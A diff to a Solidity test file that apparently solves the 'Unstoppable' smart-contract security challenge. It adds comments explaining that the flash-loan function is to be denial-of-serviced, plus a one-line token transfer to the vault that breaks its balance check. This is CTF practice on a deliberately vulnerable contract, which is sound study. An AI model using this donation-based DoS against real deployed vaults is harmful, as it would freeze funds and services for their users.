@@ -91,8 +91,10 @@ contract UnstoppableChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
+    // To pass this challage the flashloan function needs to be dos'ed
+    // To Stop the transactions I force send tokens to the vault
     function test_unstoppable() public checkSolvedByPlayer {
-        
+        token.transfer(address(vault), INITIAL_PLAYER_TOKEN_BALANCE);
     }
 
     /**
